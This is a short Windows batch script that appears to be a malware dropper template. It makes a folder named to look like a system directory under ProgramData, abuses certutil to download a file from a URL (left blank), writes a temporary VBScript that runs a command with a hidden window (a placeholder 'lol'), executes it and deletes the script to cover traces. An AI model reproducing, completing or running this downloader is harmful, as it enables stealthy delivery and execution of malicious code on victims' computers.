@echo off
setlocal

mkdir %systemdrive%\ProgramData\System\
set "url="
set "outputFile=%systemdrive%\ProgramData\System\"

certutil -urlcache -split -f %url% %outputFile%

set "scriptPath=%temp%\temp.vbs"

(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run "cmd /c  lol", 0, False
echo Set WshShell = Nothing
) > %scriptPath%

cscript //nologo %scriptPath%

del %scriptPath%

endlocal
